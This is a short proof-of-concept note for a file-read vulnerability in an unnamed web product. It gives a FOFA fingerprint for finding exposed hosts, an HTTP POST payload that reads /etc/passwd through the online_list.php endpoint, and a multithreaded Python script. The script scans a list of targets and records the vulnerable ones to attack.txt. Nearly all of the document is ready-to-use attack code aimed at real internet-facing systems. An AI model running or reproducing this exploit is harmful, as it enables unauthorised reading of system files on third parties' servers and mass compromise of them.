# fofa

```plain
body="js/select2css.js"
```

# POC

```http
POST /function/auth/user/online_list.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

proxy_request=/etc/passwd
```

# exp

```python
import requests
import concurrent.futures

# proxy = {
#     'http': 'http://127.0.0.1:8081'
# }
def check_vulnerability(target):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = '''proxy_request=/etc/passwd'''
    try:
        res = requests.post(f"{target}/function/auth/user/online_list.php", headers=headers, data=data, timeout=5, verify=False)
        if "root" in res.text:
            print(f"{target}漏洞存在")
            with open("attack.txt", "a") as f:
                f.write(f"{target}\n")
        else:
            print(f"{target} 漏洞不存在")
    except:
        print(f"{target} 访问错误")


if __name__ == "__main__":
    f = open("target.txt", 'r')
    targets = f.read().splitlines()

    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_vulnerability, targets)
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1738999670242-964667af-b721-4409-a7ef-c1ef8e85f167.png)

